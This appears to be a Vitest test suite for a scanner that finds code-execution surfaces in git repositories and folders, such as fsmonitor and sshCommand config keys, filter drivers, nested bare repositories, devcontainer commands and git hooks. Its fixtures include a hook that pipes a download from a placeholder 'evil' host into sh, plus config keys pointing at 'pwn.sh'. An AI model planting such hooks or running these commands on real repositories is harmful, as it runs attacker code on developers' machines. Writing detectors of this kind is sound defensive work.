import { chmodSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  folderSurface,
  gitConfigEntries,
  repoFindings,
  repoSurface,
} from '../../src/exposure/repo-surface.js';

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function repo(files: Record<string, string> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'stroq-repo-surface-'));
  dirs.push(root);
  mkdirSync(join(root, '.git'), { recursive: true });
  writeFileSync(join(root, '.git', 'config'), '[core]\n\trepositoryformatversion = 0\n');
  for (const [name, content] of Object.entries(files)) {
    const path = join(root, name);
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, content);
  }
  return root;
}

/** Whether the disk of the temporary folder opens `A` as `a`. */
function foldsCase(): boolean {
  const root = mkdtempSync(join(tmpdir(), 'stroq-case-'));
  try {
    writeFileSync(join(root, 'a'), '');
    return existsSync(join(root, 'A'));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

const kinds = (root: string, group: 'preTrust' | 'onOpen') =>
  repoSurface(root)[group].map((h) => h.kind);

describe('gitConfigEntries', () => {
  it('reads plain and named sections into dotted keys', () => {
    const entries = gitConfigEntries(
      '[core]\n\tfsmonitor = /tmp/x.sh\n[filter "lfs"]\n\tclean = git-lfs clean\n# comment\n',
    );
    expect(entries).toEqual([
      { key: 'core.fsmonitor', value: '/tmp/x.sh' },
      { key: 'filter.lfs.clean', value: 'git-lfs clean' },
    ]);
  });

  it('survives a config it cannot fully parse rather than throwing', () => {
    expect(gitConfigEntries('nonsense\n[unclosed\n= 3\n')).toEqual([]);
  });

  // Git takes a key on the line of its section, and a value continued on the next line.
  it.each([
    ['[core] fsmonitor = id\n', 'id'],
    ['[core]fsmonitor=id\n', 'id'],
    ['[core]; c\n\tfsmonitor = id\n', 'id'],
    ['[core] # c\n\tfsmonitor = id\n', 'id'],
    ['[core]\n\tfsmonitor = i\\\nd\n', 'id'],
    ['[CORE] FSMONITOR = id\n', 'id'],
  ])('reads %j', (text, value) => {
    const [entry] = gitConfigEntries(text);
    expect(entry?.key.toLowerCase()).toBe('core.fsmonitor');
    expect(entry?.value).toBe(value);
  });
});

describe('gitConfigEntries, read as git reads a config', () => {
  it.each([
    // A `\\` at the end of a comment does not carry the next line into it.
    ['[core]\n\tx = a # c \\\n\tfsmonitor = id\n', 'core.fsmonitor', 'id'],
    ['[core] ; \\\n\tfsmonitor = id\n', 'core.fsmonitor', 'id'],
    // Quotes, a comment after them, and an escape in the value.
    ['[core]\n\tfsmonitor = "a;b" # c\n', 'core.fsmonitor', 'a;b'],
    ['[core]\n\tfsmonitor = a\\"b\n', 'core.fsmonitor', 'a"b'],
    ['[core]\r\n\tfsmonitor = i\\\r\nd\r\n', 'core.fsmonitor', 'id'],
    // A `]` and an escaped quote inside a quoted subsection do not close the header.
    ['[includeIf "gitdir:a]b/"]\n\tpath = x\n', 'includeif.gitdir:a]b/.path', 'x'],
    ['[remote "a\\"]b"] url = x\n', 'remote.a"]b.url', 'x'],
    ['[Core.Sub]\n\tFsmonitor\n', 'core.sub.fsmonitor', 'true'],
    ['\uFEFF[core]\n\tfsmonitor = id\n', 'core.fsmonitor', 'id'],
  ])('reads %j', (text, key, value) => {
    expect(gitConfigEntries(text)).toContainEqual({ key, value });
  });

  it.each([
    '[core]\n\tfsmonitor = "open\n',
    '[core]\n\tfsmonitor = a\\q\n',
    '[core]\n\tfsmonitor # c\n',
    '[core "x" ]\n\tfsmonitor = id\n',
    '[core "x\n"]\n\tfsmonitor = id\n',
    '[]\n\tfsmonitor = id\n',
    '[co re]\n\tfsmonitor = id\n',
  ])('reports %j, which git refuses, as a line it could not read', (text) => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), text);
    const [finding] = repoFindings(repoSurface(root));
    expect(finding?.detail).toContain('could not read');
  });

  it('reports a config too large to read', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), `[core]\n${'\t# x\n'.repeat(80_000)}`);
    const [finding] = repoFindings(repoSurface(root));
    expect(finding?.detail).toContain('could not read');
  });
});

describe('a git config key written in a shape git reads', () => {
  it.each(['[core] fsmonitor = id\n', '[core]fsmonitor = id\n', '[core] sshCommand = id\n'])(
    'reports %j',
    (text) => {
      const root = repo();
      writeFileSync(join(root, '.git', 'config'), text);
      expect(kinds(root, 'preTrust')).toEqual(['git-config-exec']);
    },
  );

  it.each([
    'fsmonitor = id\n',
    '[core\n\tfsmonitor = id\n',
    '[core]\n\t= id\n',
    '[core]\n\tx y = 1\n',
  ])('reports a line it cannot place in a section, %j, rather than skip it', (text) => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), text);
    const [finding] = repoFindings(repoSurface(root));
    expect(finding?.detail).toContain('could not read');
  });
});

describe('folderSurface — a folder with no .git', () => {
  function folder(files: Record<string, string>): string {
    const root = mkdtempSync(join(tmpdir(), 'stroq-folder-surface-'));
    dirs.push(root);
    for (const [name, content] of Object.entries(files)) {
      mkdirSync(join(root, name, '..'), { recursive: true });
      writeFileSync(join(root, name), content);
    }
    return root;
  }
  const lines = (hits: readonly { kind: string; file: string; what: string }[]) =>
    hits.map((h) => `${h.kind} ${h.file} ${h.what}`);
  const BARE = { HEAD: 'ref: refs/heads/main\n', 'objects/info/packs': '', 'refs/heads/main': '' };

  // Git takes a folder that holds HEAD, objects and refs for a bare repository, and reads its
  // config, so a `git status` there runs what that config names.
  it('reports a folder that is itself a bare repository, and the commands its config runs', () => {
    const root = folder({ ...BARE, config: '[core]\n\tfsmonitor = ./pwn.sh\n' });
    const surface = folderSurface(root);
    expect(surface.isRepo).toBe(false);
    expect(lines(surface.preTrust)).toEqual([
      'nested-bare-repo . HEAD, objects, refs',
      'git-config-exec config core.fsmonitor',
    ]);
    expect(repoFindings(surface)[0]?.fix).toContain('clone');
  });

  it('reports a bare repository inside it, and lists .envrc and husky hooks as in a repository', () => {
    const root = folder({
      ...Object.fromEntries(Object.entries(BARE).map(([k, v]) => [`lib/x/${k}`, v])),
      '.envrc': 'use nix\n',
      '.husky/pre-commit': 'pnpm test\n',
    });
    const surface = folderSurface(root);
    expect(lines(surface.preTrust)).toEqual(['nested-bare-repo lib/x HEAD, objects, refs']);
    expect(lines(surface.onOpen)).toEqual([
      'husky-hook .husky/pre-commit pre-commit',
      'envrc .envrc .envrc',
    ]);
  });

  it('reports nothing for a folder of plain files', () => {
    const root = folder({ 'README.md': 'x\n', config: '[core]\n\tfsmonitor = ./pwn.sh\n' });
    expect(folderSurface(root)).toMatchObject({ isRepo: false, preTrust: [], onOpen: [] });
  });

  // Git takes a folder with HEAD and a commondir file for a repository whose objects, refs and
  // config are in the folder commondir names; config.worktree is read next to config.
  it('reads the config that a commondir file points at, and config.worktree', () => {
    const fsmonitor = '[core]\n\tfsmonitor = ./pwn.sh\n';
    const root = folder({
      HEAD: BARE.HEAD,
      commondir: 'common\n',
      'common/objects/x': '',
      'common/refs/x': '',
      'common/config': fsmonitor,
      'config.worktree': '[core]\n\tsshCommand = ./ssh.sh\n',
    });
    expect(lines(folderSurface(root).preTrust)).toEqual([
      'nested-bare-repo . HEAD, objects, refs',
      // Git takes a key in lower case, and so does the report.
      'git-config-exec config.worktree core.sshcommand',
      'git-config-exec common/config core.fsmonitor',
    ]);
  });

  it('reports a commondir that points out of the folder, and a lone commondir or gitdir file', () => {
    const root = folder({
      'a/HEAD': BARE.HEAD,
      'a/commondir': '/stroq-test-elsewhere\n',
      'b/commondir': '../a\n',
      'c/gitdir': '/stroq-test-elsewhere/.git\n',
    });
    expect(lines(folderSurface(root).preTrust)).toEqual([
      'nested-bare-repo a HEAD, objects, refs',
      'nested-bare-repo a its commondir file points out of this folder, at a config that was not read',
      'nested-bare-repo b/commondir a commondir file, which points git at the folder of another repository',
      'nested-bare-repo c/gitdir a gitdir file, which points git at the folder of another repository',
    ]);
  });

  it('reads the config a commondir names in a folder named ..x, which is inside', () => {
    const root = folder({
      HEAD: BARE.HEAD,
      commondir: '..x\n',
      '..x/objects/x': '',
      '..x/refs/x': '',
      '..x/config': '[core]\n\tfsmonitor = ./pwn.sh\n',
    });
    expect(lines(folderSurface(root).preTrust)).toContain(
      'git-config-exec ..x/config core.fsmonitor',
    );
  });

  // A disk that keeps letter case holds `config` and `CONFIG` side by side; which one a disk that
  // folds case opens is not known, so both are read.
  it.skipIf(foldsCase())('reads every name a config has on disk', () => {
    const root = folder({
      ...BARE,
      config: '[core]\n\tbare = true\n',
      CONFIG: '[core]\n\tfsmonitor = ./pwn.sh\n',
    });
    expect(lines(folderSurface(root).preTrust)).toContain('git-config-exec CONFIG core.fsmonitor');
  });

  it('reports a .git folder or file deeper in, and the commands its config runs', () => {
    const root = folder({
      ...Object.fromEntries(Object.entries(BARE).map(([k, v]) => [`sub/.git/${k}`, v])),
      'sub/.git/config': '[core]\n\tfsmonitor = ./pwn.sh\n',
      'other/.git': 'gitdir: ../sub/.git\n',
    });
    expect(lines(folderSurface(root).preTrust)).toEqual([
      'nested-bare-repo other/.git a .git file, which points git at the folder of another repository',
      'nested-bare-repo sub/.git HEAD, objects, refs',
      'git-config-exec sub/.git/config core.fsmonitor',
    ]);
  });

  it('reads dev container commands and install scripts as in a repository', () => {
    const root = folder({
      '.devcontainer/devcontainer.json': '{ "initializeCommand": "./host.sh" }',
      'package.json': JSON.stringify({ scripts: { postinstall: 'node x.js' } }),
    });
    const surface = folderSurface(root);
    expect(lines(surface.preTrust)).toEqual([
      'devcontainer-host-command .devcontainer/devcontainer.json initializeCommand',
    ]);
    expect(lines(surface.onOpen)).toEqual(['package-install-script package.json postinstall']);
  });

  it('reports a driver that the attributes of a bare folder route through its config', () => {
    const root = folder({
      ...BARE,
      config: '[filter "x"]\n\tsmudge = ./pwn.sh\n',
      'info/attributes': '* filter=x\n',
    });
    expect(lines(folderSurface(root).preTrust)).toEqual([
      'nested-bare-repo . HEAD, objects, refs',
      'git-config-exec config filter.x.smudge',
      'gitattributes-driver info/attributes filter.x',
    ]);
  });
});

describe('repoSurface — what a repository can run', () => {
  it('reports nothing outside a git repository', () => {
    const root = mkdtempSync(join(tmpdir(), 'stroq-not-a-repo-'));
    dirs.push(root);
    expect(repoSurface(root)).toMatchObject({ isRepo: false, preTrust: [], onOpen: [] });
  });

  it('finds an exec-on-read git config key', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[core]\n\tfsmonitor = /tmp/pwn.sh\n');
    expect(kinds(root, 'preTrust')).toEqual(['git-config-exec']);
    const [finding] = repoFindings(repoSurface(root));
    expect(finding?.severity).toBe('critical');
    expect(finding?.detail).toContain('core.fsmonitor');
  });

  // git's own built-in file monitor. Reporting it would put a critical finding on
  // every developer who turned the feature on, which is how a check loses its meaning.
  it('does not report core.fsmonitor set to a boolean', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[core]\n\tfsmonitor = true\n');
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('ignores ordinary configuration', () => {
    const root = repo();
    writeFileSync(
      join(root, '.git', 'config'),
      '[core]\n\tautocrlf = input\n[user]\n\temail = dev@example.com\n[remote "origin"]\n\turl = git@github.com:a/b.git\n',
    );
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('finds an include that can set those keys from outside the checkout', () => {
    const root = repo();
    writeFileSync(join(root, '.git', 'config'), '[include]\n\tpath = ../../.evil/config\n');
    expect(kinds(root, 'preTrust')).toEqual(['git-config-include']);
  });

  it('finds a nested bare repository committed as plain files', () => {
    const root = repo();
    const bare = join(root, 'docs', 'assets', 'archive');
    mkdirSync(join(bare, 'objects'), { recursive: true });
    mkdirSync(join(bare, 'refs'), { recursive: true });
    writeFileSync(join(bare, 'HEAD'), 'ref: refs/heads/main\n');
    const hit = repoSurface(root).preTrust.find((h) => h.kind === 'nested-bare-repo');
    // Every path the exposure code reports has `/` between its parts, on Windows too.
    expect(hit?.file).toBe('docs/assets/archive');
  });

  it('does not mistake the repository’s own .git for a nested one', () => {
    const root = repo();
    mkdirSync(join(root, '.git', 'objects'), { recursive: true });
    mkdirSync(join(root, '.git', 'refs'), { recursive: true });
    writeFileSync(join(root, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    expect(repoSurface(root).preTrust).toEqual([]);
  });

  it('reports a .gitattributes driver only when its command is defined here', () => {
    const root = repo({ '.gitattributes': '*.bin filter=pwn\n' });
    expect(repoSurface(root).preTrust).toEqual([]);
    writeFileSync(join(root, '.git', 'config'), '[filter "pwn"]\n\tclean = /tmp/pwn.sh\n');
    expect(kinds(root, 'preTrust').sort()).toEqual(['git-config-exec', 'gitattributes-driver']);
  });

  it('separates a devcontainer host command from one that runs in the container', () => {
    const root = repo({
      '.devcontainer/devcontainer.json':
        '{\n  // jsonc, comments and all\n  "initializeCommand": "./scripts/host.sh",\n  "postCreateCommand": "npm ci"\n}\n',
    });
    expect(kinds(root, 'preTrust')).toEqual(['devcontainer-host-command']);
    expect(kinds(root, 'onOpen')).toEqual(['devcontainer-command']);
  });

  // The whole point of the split: these are ordinary, so they are counted and listed
  // and never raised, because `stroq exposure` exits 1 on any finding.
  it('counts ordinary on-open execution without raising a finding', () => {
    const root = repo({
      '.husky/pre-commit': 'pnpm test\n',
      '.envrc': 'use flake\n',
      'package.json': '{"scripts":{"prepare":"husky","build":"tsc"}}',
    });
    const hooks = join(root, '.git', 'hooks');
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, 'pre-push'), '#!/bin/sh\nexit 0\n');
    chmodSync(join(hooks, 'pre-push'), 0o755);
    writeFileSync(join(hooks, 'pre-commit.sample'), '#!/bin/sh\n');
    chmodSync(join(hooks, 'pre-commit.sample'), 0o755);

    const surface = repoSurface(root);
    expect(surface.preTrust).toEqual([]);
    expect(repoFindings(surface)).toEqual([]);
    expect(kinds(root, 'onOpen').sort()).toEqual([
      'envrc',
      'git-hook',
      'husky-hook',
      'package-install-script',
    ]);
    expect(surface.onOpen.map((h) => h.what)).not.toContain('build');
  });
});

/**
 * Git runs most of its hooks during routine use, not only on a commit or a push: an ordinary
 * `git status` or `git add` runs `post-index-change`, a checkout runs `post-checkout`, any ref
 * update runs `reference-transaction`. An agent does those by itself, so a folder that carries a
 * `.git` with such a hook runs it before anyone approves anything. Only the four hooks the
 * pre-commit and husky installers write stay ordinary, unless their text downloads and runs code.
 */
describe.skipIf(process.platform === 'win32')('git hooks that run on routine git use', () => {
  const withHook = (name: string, body = '#!/bin/sh\necho ran\n'): string => {
    const root = repo();
    const hooks = join(root, '.git', 'hooks');
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, name), body);
    chmodSync(join(hooks, name), 0o755);
    return root;
  };

  it.each([
    'post-index-change',
    'reference-transaction',
    'post-checkout',
    'post-merge',
    'post-rewrite',
    'post-commit',
    'pre-auto-gc',
    'fsmonitor-watchman',
    'Post-Index-Change',
    'helper.sh',
  ])('reports %s as a finding', (name) => {
    const surface = repoSurface(withHook(name));
    expect(surface.preTrust.map((h) => h.file)).toEqual([`.git/hooks/${name}`]);
    expect(surface.onOpen).toEqual([]);
    expect(repoFindings(surface)).toHaveLength(1);
  });

  it.each(['pre-commit', 'pre-push', 'commit-msg', 'prepare-commit-msg'])(
    'keeps %s ordinary, and a finding once its text downloads and runs code',
    (name) => {
      expect(kinds(withHook(name), 'onOpen')).toEqual(['git-hook']);
      const fetching = withHook(name, '#!/bin/sh\ncurl -s https://evil.invalid/x | sh\n');
      expect(repoSurface(fetching).preTrust.map((h) => h.file)).toEqual([`.git/hooks/${name}`]);
    },
  );
});

/**
 * Windows has no executable bit: every file there reads back as mode 0o666 (or 0o444
 * when read-only), so the POSIX test that decides whether a git hook is live answers
 * "no" for every hook on the platform. Git for Windows runs them anyway — it carries
 * its own `sh` and does not consult a bit the filesystem never had — so the check does
 * not merely mis-rank a hook there, it stops seeing hooks at all and `stroq inspect`
 * prints a repository with no on-open execution surface.
 *
 * The platform is injected rather than read, because this suite can only ever run on
 * one of the two.
 */
describe('git hooks, where the executable bit does not exist', () => {
  /** A hook file written the way Windows would have it: present, and not executable. */
  const repoWithPlainHook = (): string => {
    const root = repo();
    const hooks = join(root, '.git', 'hooks');
    mkdirSync(hooks, { recursive: true });
    writeFileSync(join(hooks, 'pre-commit'), '#!/bin/sh\ncurl https://evil.example/u\n');
    chmodSync(join(hooks, 'pre-commit'), 0o644);
    writeFileSync(join(hooks, 'pre-push.sample'), '#!/bin/sh\n');
    chmodSync(join(hooks, 'pre-push.sample'), 0o644);
    return root;
  };

  it('counts a non-executable hook on Windows, where git runs it regardless', () => {
    const surface = repoSurface(repoWithPlainHook(), 'win32');
    expect(surface.onOpen.map((h) => h.what)).toEqual(['pre-commit']);
    expect(surface.onOpen[0]?.kind).toBe('git-hook');
  });

  it('still ignores the .sample hooks git ships, which are not installed anywhere', () => {
    expect(repoSurface(repoWithPlainHook(), 'win32').onOpen.map((h) => h.file)).not.toContain(
      '.git/hooks/pre-push.sample',
    );
  });

  // The POSIX side is unchanged: there the bit is real, an unset one means git will
  // not run the file, and reporting it would be a finding on a leftover nobody uses.
  it('keeps ignoring a non-executable hook on POSIX, where the bit means something', () => {
    expect(repoSurface(repoWithPlainHook(), 'linux').onOpen).toEqual([]);
  });

  // Windows cannot set the mode bit this test depends on; the Windows semantics have
  // their own cases above.
  it.skipIf(process.platform === 'win32')(
    'reports an executable hook on POSIX exactly as before',
    () => {
      const root = repoWithPlainHook();
      chmodSync(join(root, '.git', 'hooks', 'pre-commit'), 0o755);
      expect(repoSurface(root, 'linux').onOpen.map((h) => h.what)).toEqual(['pre-commit']);
    },
  );
});
